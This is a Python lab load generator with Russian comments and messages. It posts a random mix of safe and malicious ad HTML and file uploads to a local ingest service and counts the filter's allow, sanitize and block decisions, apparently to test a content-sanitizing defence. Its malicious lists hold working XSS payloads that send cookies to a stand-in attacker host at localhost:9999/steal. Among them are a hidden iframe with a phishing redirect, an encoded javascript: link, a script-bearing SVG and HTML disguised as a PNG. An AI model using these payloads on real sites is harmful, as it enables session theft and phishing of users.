"""Генератор лабораторной нагрузки: отправляет в collector смесь безопасных и вредоносных объектов.
Запуск: python scripts/launch_attack.py [--rounds 20] [--delay 0.3] [--url http://localhost:8001/ingest]"""
import argparse
import random
import time

import requests

ATT = "http://localhost:9999"
SVG = 'xmlns="http://www.w3.org/2000/svg"'
ADS_OK = [
    '<div class="ad"><a href="https://ads.partner-trusted.local/promo">Скидка 20%</a></div>',
    '<div class="ad"><p>Облачное хранилище <i>от 99 ₽</i></p></div>',
]
ADS_BAD = [
    f'<div><script>new Image().src="{ATT}/steal?c="+document.cookie</script></div>',
    f'<img src="x" onerror="fetch(\'{ATT}/steal?c=\'+document.cookie)">',
    f'<iframe src="{ATT}/landing" width="0" height="0"></iframe><script>location.href="{ATT}/phish"</script>',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.cookie)">Бонус</a>',
]
FILES_OK = [("logo.svg", "image/svg+xml", f'<svg {SVG}><circle cx="5" cy="5" r="4"/></svg>')]
FILES_BAD = [
    ("pic.svg", "image/svg+xml", f'<svg {SVG}><script>fetch("{ATT}/steal?c="+document.cookie)</script><rect width="5" height="5"/></svg>'),
    ("photo.png", "image/png", "<html><script>alert(document.cookie)</script></html>"),
    ("pic2.svg", "image/svg+xml", f'<svg {SVG} onload="alert(1)"><rect width="5" height="5"/></svg>'),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--rounds", type=int, default=20)
    ap.add_argument("--delay", type=float, default=0.3)
    ap.add_argument("--url", default="http://localhost:8001/ingest")
    a = ap.parse_args()
    print("=== ЗАПУСК ЛАБОРАТОРНОЙ АТАКИ ===")
    stats = {"ALLOW": 0, "SANITIZE": 0, "BLOCK": 0}
    for i in range(1, a.rounds + 1):
        malicious = random.random() < 0.6
        if random.random() < 0.6:
            html = random.choice(ADS_BAD if malicious else ADS_OK)
            body = {"kind": "ad", "source": "http://ad-network:9000/ad/random", "content": html}
        else:
            fn, mime, content = random.choice(FILES_BAD if malicious else FILES_OK)
            body = {"kind": "upload", "source": "user-upload", "filename": fn, "mime": mime, "content": content}
        r = requests.post(a.url, json=body, timeout=5).json()
        stats[r["decision"]] = stats.get(r["decision"], 0) + 1
        print(f"[{i:>3}/{a.rounds}] {body['kind']:<7} {'вредоносный' if malicious else 'безопасный':<12} -> {r['decision']}")
        time.sleep(a.delay)
    print(f"=== ИТОГ: {stats} ===")
    print("Откройте Grafana: http://localhost:3000 и журнал: http://localhost:8004/")


if __name__ == "__main__":
    main()
